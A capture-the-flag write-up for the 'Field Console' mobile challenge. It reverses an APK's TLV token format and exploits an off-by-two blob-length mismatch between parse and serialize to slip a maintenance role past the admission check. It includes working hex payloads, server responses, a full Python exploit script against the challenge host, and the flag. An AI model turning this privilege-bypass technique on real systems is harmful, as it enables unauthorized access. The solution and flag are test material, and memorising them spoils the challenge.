---
title: "Field Console"
category: "Mobile"
tags: ["Reverse", "token-parsing"]
solve_date: "2026-10-11T10:12:00+07:00"
language: "en"
---

# Field Console

**Flag:** `isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}`  
**Artifacts:** `field-console.apk` (21,167 bytes), service `nc 0.cloud.chals.io 25228`

| Artifact | SHA-256 |
|---|---|
| `field-console.apk` | `63ad1006a07fe55b7d6e161504f9f879c6083f8848b5465448916319af39fd5e` |

## Challenge

Field teams use the Field Console handset app to talk to dispatch nodes on the depot network. Routine jobs go through fine from the handset. The maintenance side is supposed to be off-limits to it. Connect to the given node and recover the flag (`isfcr{...}`).

## Initial Analysis

The APK is small (five classes) and `jadx` decompiles it cleanly. The relevant pieces:

- `DispatchClient` connects, reads one banner line `OSX dispatch node. challenge=<8 hex>`, sends a single hex-encoded token line, and reads one reply line.
- `Osx` defines the token format: magic `0x4F535831` (`OSX1`), then TLV fields — `i32` tag `0x11` (4-byte BE value), `blob` tag `0x22` (4-byte BE length + data), `acl` tag `0x33` (1 byte), `str` tag `0x44` (4-byte BE length + data), `cap` tag `0x55` (4-byte BE value). `serialize()` writes these, `parse()` reads them back, and `reparcel()` is `serialize(parse(x))`.
- `capabilityFor(chal) = Integer.rotateLeft(chal ^ 0x4F535831, 7)` is a purely algorithmic function of the banner challenge, so a valid maintenance capability can be computed offline by anyone who can read the class.
- `TokenFactory.operatorToken` = `i32(chal) || str(name) || acl(1)`; `TokenFactory.maintenanceToken` (private, never called) = `i32(chal) || cap(capabilityFor(chal)) || str(name) || acl(7)`.
- `MainActivity.runDispatch` confirms the lock: even when the "maintenance" checkbox is ticked the app prints *"maintenance mode is locked on this handset; sending operator token"* and sends the **operator** token. The client never builds a maintenance token, but its exact structure is visible in code.

Submitting the legitimate operator token to the node returns `DENY dispatch: insufficient privilege at dispatch`, so the server clearly distinguishes a parse/normalize stage, an admission stage and a dispatch stage. Fuzzing structured variants against the distinct error strings gives an oracle for each stage.

## Eliminated Hypotheses

- **Just send the maintenance token.** `i32, cap, str, acl(7)` is rejected with `DENY admission: dispatch requires a provisioned operator token` — maintenance role is refused *before* dispatch ever runs, no matter how fresh the challenge binding or how correct the capability.
- **Carry a valid capability at operator role.** `i32, cap, str, acl(1)` (and `cap, i32, str, acl(1)`) still gets `DENY dispatch: insufficient privilege at dispatch`. The capability is necessary but not sufficient; the role seen by dispatch must also be maintenance.
- **Change the operator name.** `admin`, `root`, `maintenance` as the `str` value change nothing; the name is not part of the privilege decision.
- **Plain field duplication.** `i32, acl(1), str, acl(7)` and `i32, acl(7), str, acl(1)` both fail: with `acl(7)` first the admission stage rejects the token, with `acl(1)` first dispatch reports insufficient privilege. The two stages read the *same* parsed field list, so a plain extra field cannot disagree with itself.
- **Append trailing bytes after a valid operator token.** `DENY admission: malformed token` or `DENY integrity: token did not survive normalization`; the round-trip check is real and rules out naive truncation tricks.
- **Wrap a full maintenance token in a `blob`.** Reaches a later check and is refused with `DENY integrity: role drift detected during normalization`; the server explicitly compares the role before and after normalization, so a self-contained nested token is detected.

These dead ends localize the bug: the token must present role 1 and role 7 to *different passes* of the parser, without the two field lists being independently authored.

## Exploitation Chain

1. **Map the server pipeline through its error strings.** The stage order implied by the responses is:

   ```text
   magic + parse   ->  "malformed token"
   challenge       ->  "token not bound to this challenge"     (first i32 must equal banner)
   normalization   ->  "did not survive normalization" / "role drift"
   admission       ->  "requires a provisioned operator token" (first acl must be 1)
   dispatch        ->  "insufficient privilege" / "maintenance capability missing or invalid"
   ```

   In particular, the last pair proves dispatch evaluates a **re-normalized field list** rather than the list admission used: it is the only stage that ever asks for a maintenance capability, and it never runs for a token whose original first `acl` is 7. So the goal becomes: the original parse must present `acl(1)` to admission, the normalized parse must present the maintenance role plus a valid `cap` to dispatch, and the token must stay structurally valid across the normalization round-trip.

2. **Find the parse/serialize asymmetry in `blob`.** `Osx.parse` reads a 4-byte declared length `L` but then consumes only `L - 2` body bytes:

   ```java
   int iRi = ri(bArr, i2);   // declared length L
   if (iRi < 0 || iRi > MAX_LEN) throw new OsxException("blob len range");
   int i5 = iRi - 2;         // <-- off-by-two: body is L-2, not L
   if (i5 < 0 || i5 > bArr.length - i4) throw new OsxException("blob body oob");
   int i6 = i5 + i4;
   arrayList.add(Field.blob(Arrays.copyOfRange(bArr, i4, i6)));
   i = i6;
   ```

   `serialize()` writes the body back with `wi(field.blob.length)`, i.e. the *stored* body length (`0x22 00000004 33073301` for the example above). So parse and serialize disagree by exactly 2 bytes on every blob: each `parse`/`serialize` round moves 2 bytes out of a blob's declared region and back into the surrounding field stream. The APK even ships the routine the node uses — `reparcel() = serialize(parse(x))`.

   That 2-byte displacement is exploitable because `acl` is the smallest field in the format at exactly 2 bytes (`tag + 1 value`). Declaring a blob 2 bytes longer than the `acl` pair it covers makes the first parse treat a role field as opaque blob content, and the normalized parse expose it again as a real top-level field. Roles can therefore be positioned so that only one of the two passes sees them.

3. **Construct the two-faced token.** `acl(7) || acl(1)` (4 bytes) inside a blob declared as 6, then a valid capability, the operator name and a trailing `acl(1)`:

   ```text
   4f535831                    magic "OSX1"
   11 <challenge>              i32 : binds to this session's banner
   22 00000006 33073301        blob: declared 6, only 4 body bytes (acl(7) acl(1))
   55 capabilityFor(challenge) cap  : valid maintenance capability
   44 00000008 "operator"      str
   33 01                       acl(1)
   ```

   Wire bytes for `challenge=82f3e553` (capability `d05eb166`):

   ```text
   4f5358311182f3e55322000000063307330155d05eb16644000000086f70657261746f723301
   ```

   Walking the token through the client's own parser (whose behaviour the node's error messages track closely) gives the two views:

   ```text
   pass 1 (what admission reads)
     i32 0x82f3e553 | blob 33073301 | cap 0xd05eb166 | str "operator" | acl 1
     top-level acl  -> 1      => "provisioned operator token", accepted

   after serialize():  blob field re-emits as 22 00000004 33073301  (length 6 -> 4)
   pass 2 (what dispatch reads)
     i32 0x82f3e553 | blob 3307 | acl 1 | cap 0xd05eb166 | str "operator" | acl 1
     top-level acl  -> still 1  => no role drift, integrity checks stay quiet
     blob body      -> 3307     => a self-contained acl(7) field, i.e. the maintenance role
   ```

   The maintenance role therefore never appears in the top-level list that admission checks; it exists only as blob content in the normalized token, and that is what the dispatch stage acts on once a valid capability is present.

4. **Choose which 2 bytes the blob gives back.** The displacement always releases 2 bytes, but *which* pair decides whether the drift check fires. Four layouts were tested against the node in one run:

   ```text
   v1  blob body 00003307 | str, acl(1), cap          -> role drift detected during normalization
   v2  blob body 00003307 | cap, str, acl(1)          -> role drift detected during normalization
   v3  blob body 00003307 | str, acl(1), cap, acl(1)  -> role drift detected during normalization
   v4  blob body 33073301 | cap, str, acl(1)          -> GRANT isfcr{...}
   ```

   With body `00 00 33 07` (v1-v3) the shrunken blob leaves `33 07` behind, which re-parses as a top-level `acl(7)`: the normalized token claims role 7 while the original claimed role 1, and drift fires. With body `33 07 33 01` (v4) the released pair is `33 01` - a duplicate of the role the token already advertises - so the top-level role is unchanged across normalization while the maintenance role stays inside the blob body. Field order also matters: in the no-capability variants, the blob placed *before* `str`/`acl` draws `DENY dispatch: maintenance capability missing or invalid`, while the same fields with the blob placed *after* them draw `DENY dispatch: insufficient privilege at dispatch` - so dispatch only takes the maintenance path when the blob precedes the operator fields.

   Removing the `cap` field from v4 yields `DENY dispatch: maintenance capability missing or invalid` - direct evidence that a token admission accepted as an operator token reached the maintenance code path, i.e. the two stages really did read different views of the same bytes. The precise predicate of the drift comparison is server-side and was not recoverable from the client, so this section combines the client-derived parse model with the observed transitions rather than claiming full knowledge of the implementation.

5. **Verify on the target.** Three fresh connections with different banner challenges, plus the two controls:

   ```text
   banner='OSX dispatch node. challenge=82f3e553'
   payload=4f5358311182f3e55322000000063307330155d05eb16644000000086f70657261746f723301
   -> GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}

   banner='OSX dispatch node. challenge=0dda96d0'
   payload=4f535831110dda96d02200000006330733015544e770a144000000086f70657261746f723301
   -> GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}

   banner='OSX dispatch node. challenge=2bf83bec'   (run of solve_field_console.py, section below)
   payload=4f535831112bf83bec2200000006330733015555b1eeb244000000086f70657261746f723301
   -> GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}
   no-cap control     -> DENY dispatch: maintenance capability missing or invalid
   operator control   -> DENY dispatch: insufficient privilege at dispatch
   ```

## Flag

`isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}`

The node returned the flag in its `GRANT` line on three independent connections with different challenges, so the flag is service-confirmed rather than merely recovered.

## Reproduce

Requires Python 3 (standard library only); the node must be reachable. Decompile the APK with `jadx -d out field-console.apk` for the analysis, then save the exploit as `solve_field_console.py`:

```python
import socket

MAGIC = 0x4F535831  # "OSX1"


def i32(v):
    return (v & 0xFFFFFFFF).to_bytes(4, "big")


def capability_for(chal):
    v = (chal ^ MAGIC) & 0xFFFFFFFF
    return ((v << 7) | (v >> 25)) & 0xFFFFFFFF  # Integer.rotateLeft(v, 7)


def token(chal):
    return (i32(MAGIC)
            + b"\x11" + i32(chal)                     # i32: session binding
            + b"\x22" + i32(6) + b"\x33\x07\x33\x01"  # blob: declared 6, body 4 bytes
            + b"\x55" + i32(capability_for(chal))     # cap: maintenance capability
            + b"\x44" + i32(8) + b"operator"          # str
            + b"\x33\x01")                            # acl(1)


print("check cap(82f3e553) =", hex(capability_for(0x82f3e553)))
print("check cap(0dda96d0) =", hex(capability_for(0x0dda96d0)))

s = socket.create_connection(("0.cloud.chals.io", 25228), timeout=15)
banner = s.recv(4096).decode().strip()
print("banner:", banner)
chal = int(banner.split("challenge=")[1].split()[0], 16)
payload = token(chal)
print("payload:", payload.hex())
s.sendall(payload.hex().encode() + b"\n")
print("response:", s.recv(4096).decode().strip())
s.close()

# negative control: drop the cap field
s = socket.create_connection(("0.cloud.chals.io", 25228), timeout=15)
banner = s.recv(4096).decode().strip()
chal = int(banner.split("challenge=")[1].split()[0], 16)
nocap = (i32(MAGIC) + b"\x11" + i32(chal)
         + b"\x22" + i32(6) + b"\x33\x07\x33\x01"
         + b"\x44" + i32(8) + b"operator" + b"\x33\x01")
s.sendall(nocap.hex().encode() + b"\n")
print("no-cap control:", s.recv(4096).decode().strip())
s.close()

# negative control: honest operator token
s = socket.create_connection(("0.cloud.chals.io", 25228), timeout=15)
banner = s.recv(4096).decode().strip()
chal = int(banner.split("challenge=")[1].split()[0], 16)
op = i32(MAGIC) + b"\x11" + i32(chal) + b"\x44" + i32(8) + b"operator" + b"\x33\x01"
s.sendall(op.hex().encode() + b"\n")
print("operator control:", s.recv(4096).decode().strip())
s.close()
```

Run:

```powershell
python solve_field_console.py
```

Observed output from the solve session (banner challenge `2bf83bec`, capability `55b1eeb2`):

```text
check cap(82f3e553) = 0xd05eb166
check cap(0dda96d0) = 0x44e770a1
banner: OSX dispatch node. challenge=2bf83bec
payload: 4f535831112bf83bec2200000006330733015555b1eeb244000000086f70657261746f723301
response: GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}
no-cap control: DENY dispatch: maintenance capability missing or invalid
operator control: DENY dispatch: insufficient privilege at dispatch
```

The two `check cap(...)` lines confirm the capability derivation against the earlier sessions quoted in step 5. A third control - the honest maintenance token `i32, cap, str, acl(7)`, which yields `DENY admission: dispatch requires a provisioned operator token` - has to be sent by hand, since the script above only builds operator-role tokens.
